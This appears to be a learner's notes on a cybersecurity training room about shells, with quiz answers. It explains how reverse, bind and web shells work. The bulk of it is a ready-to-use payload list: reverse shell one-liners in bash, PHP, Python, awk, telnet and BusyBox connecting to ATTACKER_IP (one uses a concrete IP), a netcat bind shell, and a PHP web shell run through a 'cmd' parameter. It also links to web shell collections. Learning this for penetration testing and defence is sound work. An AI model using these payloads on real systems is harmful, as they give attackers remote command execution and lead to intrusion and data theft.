Room Introduction

Introduction
Shells in cyber security are widely used by attackers to remotely control systems, making them an important part of the attack chain.

Following learning objectives:
1. Understand Shells in Offensive Security 
2. Set Up and Use Reverse and Bind Shells
3. Deploy Web Shells 

Caveats
The use of Metasploit or other Frameworks that generate or interact with shells has been intentionally left behind from this room. This is to focus on understanding how shells work without the use or assistance of a tool to either set up or generate a shell.


Shell Overview

What is a Shell?
A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.

In cyber security, it commonly refers to a specific shell session an attacker uses when accessing a compromised system, allowing them to run commands and execute software. This will allow attackers to execute several activities, 
some of which are described below.
1. Remote System Control: allows the attacker to execute commands or software remotely in the target system.
2. Privilege Escalation: If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.
3. Data Exfiltration: Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it.
4. Persistence and Maintenance Access: Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.
5. Post-Exploitation Activities: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information.
6. Access Other Systems on the Network: Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot to different points in the compromised system network. This is also known as pivoting.

Question 1: What is the command-line interface that allows users to interact with an operating system?
Answer: Shell

Question 2: What process involves using a compromised system as a launching pad to attack other machines in the network?
Answer: Pivoting

Question 3: What is a common activity attackers perform after obtaining shell access to escalate their privileges?
Answer: Privilege Escalation


Reverse Shell

A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

How Reverse Shells Work
1. Set up a Netcat (nc) Listener
machine will be waiting for a connection, so let's use Netcat to listen to a connection using the following command nc -lvnp 443.
Command Description based on options used:
The command above uses the -l option to indicate Netcat to listen or wait for a connection. The -v option enables verbose mode. The -n option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address. Finally, the -p flag indicates the port that will be used to wait for the connection, in the case above, port 443.

Note: Attackers and pentesters tend to use known ports used by other applications like 53, 80, 8080, 443, 139, or 445. This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.

2. Gaining Reverse Shell Access
Once we have our listener set, the attacker should execute what is known as a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network. There's a variety of payloads that will depend on the tools and OS of the compromised system.

Cheatsheet on Reverse Shell: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

example, let's analyze an example payload named a pipe reverse shell, as shown below.
Command: rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
Explanation of the Payload: 
1. rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.
2. mkfifo /tmp/f - This command creates a named pipe, or FIFO (first-in, first-out), at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
3. cat /tmp/f - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
4. | bash -i 2>&1 - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
5. | nc ATTACKER_IP ATTACKER_PORT >/tmp/f - This part pipes the shell's output through nc (Netcat) to the attacker's IP address (ATTACKER_IP) on the attacker's port (ATTACKER_PORT).
6. >/tmp/f -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

payload above can expose the shell bash through the network to the desired listener.

Question 1: What type of shell allows an attacker to execute commands remotely after the target connects back?
Answer: Reverse Shell

Question 2: What tool is commonly used to set up a listener for a reverse shell?
Answer: Netcat


Bind Shell 

A bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.

Note: This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection.

How bind shells work
1. Setting Up the Bind Shell on the Target
create a bind shell. In this case, the attacker can use a command like the one below on the target machine.
command: "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f"
Explanation of the Payload
1. rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.
2. mkfifo /tmp/f - This command creates a named pipe, or FIFO, at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
3. cat /tmp/f - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
4. | bash -i 2>&1 - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring error messages are returned to the attacker.
5. | nc -l 0.0.0.0 8080 - Starts Netcat in listen mode (-l) on all interfaces (0.0.0.0) and port 8080. The shell will be exposed to the attacker once they connect to this port.
6. >/tmp/f This final part sends the commands' output back into the named pipe, allowing for bidirectional communication.

Note: ports below 1024 will require Netcat to be executed with elevated privileges.

2. Attacker Connects to the Bind Shell
target machine is waiting for incoming connections, we can use Netcat again with the following command to connect.
command: "nc -nv TARGET_IP 8080"

Explanation of the command
1. nc - This invokes Netcat, which establishes the connection to the target.
2. -n - Disables DNS resolution, allowing Netcat to operate faster and avoid unnecessary lookups.
3. -v - Verbose mode provides detailed output of the connection process, such as when the connection is established.
4. TARGET_IP - The IP address of the target machine where the bind shell is running.
5. 8080 - The port number on which the bind shell listens.

Question 3: What type of shell opens a specific port on the target for incoming connections from the attacker?
Answer: Bind Shell

Question 4: Listening below which port number requires root access or privileged permissions?
Answer: 1024


Shell Listeners

explore some tools that can be used as listeners to interact with an incoming shell.
1. Rlwrap: Small utility that uses the GNU readline library to provide editing keyboard and history.
Usage: Rlwrap nc -lvnp <PORT>
Explination: This wraps nc with rlwrap, allowing the use of features like arrow keys and history for better interaction.

2. Ncat: Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).
Usage: ncat -lvnp <PORT> or ncat --ssl -lvnp <PORT>
Explination: The --ssl option enables SSL encryption for the listener.

3. Socat: It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.
Usage: socat -d -d TCP-LISTEN:<PORT> STDOUT
Explination: The command above used the -d option to enable verbose output; using it again (-d -d) will increase the verbosity of the commands. The TCP-LISTEN:<PORT> option creates a TCP listener on port <PORT>, establishing a server socket for incoming connections. Finally, the STDOUT option directs any incoming data to the terminal.

Question 5: Which flexible networking tool allows you to create a socket connection between two data sources?
Answer: socat

Question 6: Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener?
Answer: rlwrap

Question 7: What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support for listening to encrypted shells?
Answer: Ncat 


Shell Payloads

Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell.

some of these payloads that can be used in the Linux OS to expose the shell through the most popular reverse shell.
1. Bash
a. Normal Bash Reverse Shell
Usage: bash -i >& /dev/tcp/<AttackerIP>/<PORT> 0>&1
Explination: This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (ATTACKER_IP) on port <PORT>. The >& operator combines both standard output and standard error.

b. Bash Read Line Reverse Shell
Usage: exec 5<>/dev/tcp/<ATTACKER_IP>/<PORT>; cat <&5 | while read line; do $line 2>&5 >&5; done 
Explination: This reverse shell creates a new file descriptor (5 in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.

c. Bash With File Descriptor 196 Reverse Shell
Usage: 0<&196;exec 196<>/dev/tcp/<ATTACKER_IP>/<PORT>; sh <&196 >&196 2>&196 
Explination: This reverse shell uses a file descriptor (196 in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection.

d. Bash With File Descriptor 5 Reverse Shell
Usage: bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
Explination: command opens a shell (bash -i), but it uses file descriptor 5 for input and output, enabling an interactive session over the TCP connection.

2. PHP
a. PHP Reverse Shell Using the exec Function
Usage: php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
Explination: This reverse shell creates a socket connection to the attacker's IP on port 443 and uses the exec function to execute a shell, redirecting standard input and output.

b. PHP Reverse Shell Using the shell_exec Function
Usage: php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
Explination:  reverse shell creates a socket connection to the attacker's IP on port 443 and uses the shell_exec function to execute a shell, redirecting standard input and output.

c. PHP Reverse Shell Using the system Function
Usage: php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
Explination: This reverse shell employs the system function, which executes the command and outputs the result to the browser.

d. PHP Reverse Shell Using the passthru Function
Usage: php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
Explination: The passthru function executes a command and sends raw output back to the browser. This is useful when working with binary data.

e. PHP Reverse Shell Using the popen Function
Usage: php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
Explination: This reverse shell uses popen to open a process file pointer, allowing the shell to be executed.

3. Python
Note: the following snippets below require using python -c to run, indicated by the placeholder PY-C
a. Python Reverse Shell by Exporting Environment Variables
Usage: export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
Explination: This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.

b. Python Reverse Shell Using the subprocess Module
Usage: PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
Explination: This reverse shell uses the subprocess module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.

c. Short Python Reverse Shell
Usage: PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
Explination: This reverse shell creates a socket (s), connects to the attacker, and redirects standard input, output, and error to the socket using os.dup2().

4. Others
a. Telnet
Usage: TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
Explination: This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443

b. AWK
Usage: awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
Explination: This reverse shell uses AWK’s built-in TCP capabilities to connect to ATTACKER_IP:443. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.

c. BusyBox
Usage: busybox nc ATTACKER_IP 443 -e sh
Explination: This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker.

Question 8: Which Python module is commonly used for managing shell commands and establishing reverse shell connections in security assessments?
Answer: subprocess

Question 9: What shell payload method in a common scripting language uses the exec, shell_exec, system, passthru, and popen functions to execute commands remotely through a TCP connection?
Answer: PHP

Question 10: Which scripting language can use a reverse shell by exporting environment variables and creating a socket connection?
Answer: Python


Web Shell

A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.

Note: Web shells can be written in several languages supported by web servers, like PHP, ASP, JSP, and even simple CGI scripts. 

Ex: PHP web shell
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

Usage of the example code to compromise a target:
The above shell can be saved into a file with the PHP extension, like shell.php, and then uploaded into the web server by the attacker by exploiting vulnerabilities such as Unrestricted File Upload, File Inclusion, Command Injection, among others, or by gaining unauthorized access to it. 

After the web shell is deployed in the server, it can be accessed through the URL where the web shell is hosted, in this example http://victim.com/uploads/shell.php. As we observed from the code in shell.php, we need to provide a GET method and the value of the variable cmd, which should contain the command the attacker wants to execute. For example, if we want to execute the command whoami the request to the URL should be:
http://victim.com/uploads/shell.php?cmd=whoami
The above will execute the command whoami and display the result in the web browser.

Existing Web Shells Available Online
The power of supported languages by the web servers can result in web shells with lots of functionality and avoid detection at the same time. 

some of the most popular web shells that can be found online 
1. p0wny-shell(https://github.com/flozz/p0wny-shell) - A minimalistic single-file PHP web shell that allows remote command execution
2. b374k shell(https://github.com/b374k/b374k) - A more feature-rich PHP web shell with file management and command execution, among other functionalities.
3. c99 shell(https://www.r57shell.net/single.php?id=13) - A well-known and robust PHP web shell with extensive functionality.

To find more web shell visit: https://www.r57shell.net/index.php

Question 11: What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?
Answer: Unrestricted File Upload

Question 12: What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?
Answer: Web Shell


Conclusion

Reverse Shells establish a connection from a compromised machine back to an attacker's system. Bind Shells, on the other hand, listen for incoming connections on a compromised machine, and Web Shells offer attackers a unique avenue for exploiting vulnerabilities in web applications.

Understanding shells is critical for security professionals to either perform penetration testing exercises or to identify and defend systems
